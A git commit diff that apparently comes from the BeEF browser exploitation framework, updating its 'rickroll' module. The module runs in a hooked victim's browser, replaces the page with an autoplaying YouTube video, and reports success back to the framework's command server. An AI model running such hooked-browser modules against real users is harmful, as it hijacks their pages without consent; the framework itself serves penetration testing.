d0fbba2e2dde44f7c0a19d141b27c1c429705577
Nbblrr <Nbblrr>
2014-06-05 10:53:20 +0200

    Fixes bug in rickroll module (#1017)

--- modules/browser/hooked_domain/rickroll/command.js
+++ modules/browser/hooked_domain/rickroll/command.js
@@ -9,8 +9,7 @@ beef.execute(function() {
 
 	$j('body').css({'padding':'0px', 'margin':'0px', 'height':'100%'});
 	$j('html').css({'padding':'0px', 'margin':'0px', 'height':'100%'});
-	
-	$j('body').html('<object width="100%" height="100%"><param name="movie" value="http://www.youtube.com/v/oHg5SJYRHA0?fs=1&amp;hl=en_US&amp;autoplay=1&amp;iv_load_policy=3"><param name="allowFullScreen" value="true"><param name="allowscriptaccess" value="always"><embed src="http://www.youtube.com/v/oHg5SJYRHA0?fs=1&amp;hl=en_US&amp;autoplay=1&amp;iv_load_policy=3" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" width="100%" height="100%"></object>');
-	
+
+        $j('body').html('<iframe width="100%" height="100%" src="//www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" frameborder="0" allowfullscreen></iframe>');
 	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Rickroll Successful");
 });
